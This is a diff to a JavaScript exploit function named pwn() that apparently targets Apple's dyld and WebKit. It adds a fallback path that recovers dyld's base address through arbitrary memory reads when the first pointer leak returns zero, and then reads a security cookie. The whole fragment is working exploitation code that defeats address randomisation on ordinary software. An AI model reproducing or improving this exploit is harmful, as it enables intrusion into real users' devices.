@@ -239,9 +239,17 @@ function pwn() {
     var mach_task_self_ = read64(Add(libsystem_kernel_base, offsets.mach_task_self_));
 
     // longjmp mitigation?; nullify when read *(uint64_t *)(_ReadStatusReg(TPIDRRO_EL0) + 0x38);
+    var dyld_base;
     var __ZZ6dlopenE1p = read64(Add(libdyld_base, offsets.__ZZ6dlopenE1p));
     log(`[i] __ZZ6dlopenE1p = ${__ZZ6dlopenE1p}`);
-    var dyld_base = Sub(__ZZ6dlopenE1p, offsets.dlopen_internal); //_dlopen_internal = 0xc918
+    dyld_base = Sub(__ZZ6dlopenE1p, offsets.dlopen_internal); //_dlopen_internal = 0xc918
+    if(__ZZ6dlopenE1p == 0) {
+        log(`[-] __ZZ6dlopenE1p is 0, finding other offsets`);
+        var __ZL25sNotifyMonitoringDyldMain = read64(Add(libdyld_base, offsets.__ZL25sNotifyMonitoringDyldMain));
+        log(`[i] __ZL25sNotifyMonitoringDyldMain = ${__ZL25sNotifyMonitoringDyldMain}`);
+        dyld_base = Sub(__ZL25sNotifyMonitoringDyldMain, offsets.__ZN4dyldL24notifyMonitoringDyldMainEv); //__ZN4dyldL24notifyMonitoringDyldMainEv = 0x8a1c
+    }
+
     log(`[i] dyld_base = ${dyld_base}`);
     var cookieAddr = Add(dyld_base, offsets.cookieAddr);
     log(`[i] read cookie  = ${read64(cookieAddr)}`);
